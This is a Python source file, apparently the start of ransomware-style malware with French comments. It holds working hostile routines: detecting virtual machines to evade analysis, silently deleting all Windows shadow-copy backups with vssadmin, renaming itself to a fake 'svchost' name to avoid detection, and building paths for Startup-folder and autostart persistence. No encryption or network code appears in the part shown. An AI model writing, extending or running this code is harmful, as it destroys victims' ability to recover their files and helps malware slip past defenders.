# -*- coding: utf-8 -*-
import os, sys, random, time, subprocess, ctypes, psutil
from pathlib import Path

def is_admin():
    try:
        if os.name == 'nt': return ctypes.windll.shell32.IsUserAnAdmin() != 0
        else: return os.getuid() == 0
    except: return False

def check_anti_vm():
    vm_keywords = ['virtualbox', 'vmware', 'qemu', 'microsoft corporation']
    for proc in psutil.process_iter(['name']):
        if any(key in proc.info['name'].lower() for key in vm_keywords):
            return True
    return False

def delete_shadow_copies():
    """FONCTION CRUCIALE : Supprime les sauvegardes Windows"""
    if os.name == 'nt' and is_admin():
        try:
            subprocess.run(['vssadmin.exe', 'delete', 'shadows', '/all', '/quiet'], 
                           shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except: pass

def evade_detection():
    try:
        os.rename(sys.argv[0], f"svchost{random.randint(1000,9999)}.py")
    except: pass
    time.sleep(random.uniform(0.5, 2.0))

def clear_screen():
    subprocess.run(['cls' if os.name == 'nt' else 'clear'], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def simulate_persistence():
    if os.name == 'nt':
        return os.path.expanduser(r"~\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\svchost.py")
    return Path.home() / ".config/autostart/svchost.service"
